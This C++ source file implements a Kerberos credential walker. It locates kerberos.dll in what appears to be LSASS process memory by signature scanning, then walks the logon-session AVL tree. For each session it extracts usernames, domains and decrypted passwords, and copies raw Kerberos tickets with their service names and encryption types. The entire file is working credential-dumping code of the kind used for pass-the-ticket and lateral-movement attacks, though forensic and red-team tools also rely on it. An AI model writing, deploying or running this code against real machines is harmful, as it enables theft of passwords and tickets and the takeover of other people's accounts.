#include "lsa/kerberos_walker.h"

#include "core/signature_scanner.h"
#include "lsa/reader_utils.h"

namespace kvc::lsa {

KerberosWalker::KerberosWalker(const core::VirtualMemory& vmem,
                               const core::ModuleIndex& modules,
                               const security::LsaSecretsExtractor* extractor,
                               const templates::KerberosTemplateSpec* tmpl)
    : vmem_(vmem), modules_(modules), extractor_(extractor), tmpl_(tmpl) {}

void KerberosWalker::walk(std::vector<LogonSession>& sessions) const {
    if (!tmpl_ || tmpl_->signature.empty()) return;
    const auto* mod = modules_.find("kerberos.dll");
    if (!mod) return;

    const std::uint64_t sig_pos = core::scan_module_first(
        vmem_, *mod,
        std::span<const std::uint8_t>(tmpl_->signature.data(), tmpl_->signature.size()));
    if (sig_pos == 0) return;

    const std::uint64_t erl = sig_pos + static_cast<std::int64_t>(tmpl_->first_entry_offset);
    std::int32_t rel = 0;
    if (!vmem_.read_struct(erl, &rel)) return;
    const std::uint64_t avl_table_loc = erl + 4 + static_cast<std::int64_t>(rel);

    auto avl_table_ptr = vmem_.read_u64(avl_table_loc);
    if (!avl_table_ptr || *avl_table_ptr == 0) return;
    auto root = vmem_.read_u64(*avl_table_ptr + 16);
    if (!root || *root == 0) return;

    std::set<std::uint64_t> visited;
    walk_avl(*root, *avl_table_ptr, sessions, visited);
}

void KerberosWalker::walk_avl(std::uint64_t node, std::uint64_t table,
                              std::vector<LogonSession>& sessions,
                              std::set<std::uint64_t>& visited) const {
    if (node == 0 || node == table) return;
    std::vector<std::uint64_t> stack{node};

    while (!stack.empty()) {
        const std::uint64_t current = stack.back();
        stack.pop_back();
        if (current == 0 || current == table) continue;
        if (!visited.insert(current).second) continue;

        std::uint64_t session_ptr = vmem_.read_u64(current + 32).value_or(0);
        if (session_ptr != 0) {
            auto luid_exists = [&](std::uint64_t luid) {
                if (luid == 0) return false;
                for (const auto& s : sessions)
                    if (s.authentication_id == luid) return true;
                return false;
            };

            std::uint64_t entry_luid = vmem_.read_u64(session_ptr + tmpl_->session_luid_offset).value_or(0);
            if (!luid_exists(entry_luid)) {
                for (auto off : tmpl_->session_luid_fallback_offsets) {
                    auto alt = vmem_.read_u64(session_ptr + off);
                    if (alt && luid_exists(*alt)) { entry_luid = *alt; break; }
                }
            }

            const std::string user = vmem_.read_unicode_string(session_ptr + tmpl_->session_username_offset);
            const std::string dom = vmem_.read_unicode_string(session_ptr + tmpl_->session_domain_offset);

            const auto pwd_off = tmpl_->session_password_ustr_offset;
            const std::uint16_t pwd_len = vmem_.read_u16(session_ptr + pwd_off).value_or(0);
            const std::uint16_t pwd_max = vmem_.read_u16(session_ptr + pwd_off + 2).value_or(0);
            const std::uint64_t pwd_buf = vmem_.read_u64(session_ptr + pwd_off + 8).value_or(0);

            std::string password, password_hex;
            if (pwd_max > 0 && pwd_buf != 0 && extractor_ && extractor_->is_initialized()) {
                std::vector<std::byte> enc(pwd_max);
                if (vmem_.read_bytes(pwd_buf, pwd_max, enc)) {
                    auto dec = extractor_->decrypt(enc);
                    decode_password_candidate(dec, pwd_len, password, password_hex);
                }
            }

            if (entry_luid != 0) {
                for (auto& s : sessions) {
                    if (s.authentication_id == entry_luid) {
                        KerberosCredential c;
                        c.luid = entry_luid;
                        c.username = user; c.domainname = dom;
                        c.password = password; c.password_hex = password_hex;
                        walk_tickets(session_ptr, c);
                        if (c.username.empty() && (!c.password.empty() || !c.password_hex.empty() || !c.tickets.empty()))
                            c.username = s.username;
                        if (c.domainname.empty() && (!c.password.empty() || !c.password_hex.empty() || !c.tickets.empty()))
                            c.domainname = s.domainname;
                        if (c.username.empty() && c.domainname.empty() &&
                            c.password.empty() && c.password_hex.empty() && c.tickets.empty()) {
                            break;
                        }
                        s.kerberos_credentials.push_back(std::move(c));
                        break;
                    }
                }
            }
        }

        const std::uint64_t left = vmem_.read_u64(current + 8).value_or(0);
        const std::uint64_t right = vmem_.read_u64(current + 16).value_or(0);
        if (right != 0 && right != table && !visited.count(right)) stack.push_back(right);
        if (left != 0 && left != table && !visited.count(left)) stack.push_back(left);
    }
}

void KerberosWalker::walk_tickets(std::uint64_t session_ptr, KerberosCredential& cred) const {
    if (!tmpl_ || tmpl_->ticket_list_offsets.empty()) return;
    for (const std::size_t offset : tmpl_->ticket_list_offsets) {
        std::uint64_t flink = vmem_.read_u64(session_ptr + offset).value_or(0);
        const std::uint64_t list_head = session_ptr + offset;
        if (flink == 0 || flink == list_head || flink == list_head - 4) continue;

        std::set<std::uint64_t> visited;
        std::uint64_t current = flink;
        while (current != 0 && current != list_head) {
            if (!visited.insert(current).second) break;

            const std::uint64_t svc = vmem_.read_u64(current + tmpl_->ticket_service_name_offset).value_or(0);
            const std::uint64_t tgt = vmem_.read_u64(current + tmpl_->ticket_target_name_offset).value_or(0);
            const std::uint64_t cli = vmem_.read_u64(current + tmpl_->ticket_client_name_offset).value_or(0);
            const std::uint32_t flags = vmem_.read_u32(current + tmpl_->ticket_flags_offset).value_or(0);
            const std::uint32_t enc = vmem_.read_u32(current + tmpl_->ticket_enc_type_offset).value_or(0);
            const std::uint32_t kvno = vmem_.read_u32(current + tmpl_->ticket_kvno_offset).value_or(0);
            const std::uint32_t tlen = vmem_.read_u32(current + tmpl_->ticket_buffer_len_offset).value_or(0);
            const std::uint64_t tbuf = vmem_.read_u64(current + tmpl_->ticket_buffer_ptr_offset).value_or(0);

            const auto ext_off = tmpl_->external_name_first_string_offset;
            std::string svc_name, tgt_name, cli_name;
            if (svc != 0) svc_name = vmem_.read_unicode_string(svc + ext_off);
            if (tgt != 0) tgt_name = vmem_.read_unicode_string(tgt + ext_off);
            if (cli != 0) cli_name = vmem_.read_unicode_string(cli + ext_off);

            if (tlen > 0 && tlen < 0x10000 && tbuf != 0) {
                std::vector<std::byte> data(tlen);
                if (vmem_.read_bytes(tbuf, tlen, data)) {
                    KerberosTicket t;
                    t.service_name = svc_name; t.target_name = tgt_name; t.client_name = cli_name;
                    t.flags = flags; t.enc_type = enc; t.kvno = kvno;
                    t.data = std::move(data);
                    cred.tickets.push_back(std::move(t));
                }
            }

            auto next = vmem_.read_u64(current);
            if (!next) break;
            current = *next;
        }
    }
}

} // namespace kvc::lsa
